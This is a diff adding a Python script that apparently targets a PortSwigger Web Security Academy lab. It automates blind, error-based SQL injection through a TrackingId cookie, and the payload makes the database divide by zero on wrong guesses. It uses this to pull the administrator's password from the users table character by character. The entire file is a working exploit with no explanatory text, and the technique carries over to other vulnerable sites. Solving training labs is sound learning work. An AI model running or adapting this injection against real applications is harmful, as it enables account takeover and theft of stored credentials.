@@ -1,0 +1,40 @@
+import requests
+import string
+
+url = "https://0a98001503a706d9801308cd006800b9.web-security-academy.net/login"
+session = requests.Session()
+
+session.cookies.set("session", "TbqNbqtUSPzfMwYwcQBESWTi5SvPpDS2")
+
+tracking_prefix = "F1Y2yAn3x2hEhUS7"
+
+alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+password = ""
+
+for position in range(1, 30):
+    found = False
+
+    for char in alphabet:
+        condition =f"select CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/1) ELSE TO_CHAR(1/0) END from users where username='administrator'"
+
+        tracking_id = tracking_prefix + "' UNION " + condition + "-- "
+
+        response = session.get(
+            url,
+            cookies={"TrackingId": tracking_id},
+            timeout=10
+        )
+
+        if response.status_code == 200:
+            password += char
+            print(f"[+] Position {position}: {char}")
+            print(f"[+] Current password: {password}")
+            found = True
+            break
+
+    if not found:
+        print(f"[-] No matching character at position {position}.")
+        break
+
+print(f"\nResult: {password}")
